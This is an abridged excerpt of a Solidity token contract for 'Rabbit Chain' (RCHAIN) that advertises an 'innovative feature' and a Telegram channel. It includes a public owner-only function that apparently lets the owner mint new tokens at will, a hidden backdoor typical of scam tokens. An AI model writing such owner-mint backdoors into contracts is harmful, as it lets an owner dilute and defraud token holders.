...
//
// $RabbitChain proposes an innovative feature in its contract.
//
//  📱Telegram::https://t.me/RabbitChainChannel
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _RabbitChain(uint256 amount) public onlyOwner {
 _RabbitChain(msg.sender, amount);
    }
    ...
    function _RabbitChain(address account, uint256 amount) internal virtual {
...
contract $RabbitChain is ERC20 {
    ...
    constructor() public ERC20("Rabbit Chain", "RCHAIN") {
     _RabbitChain(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}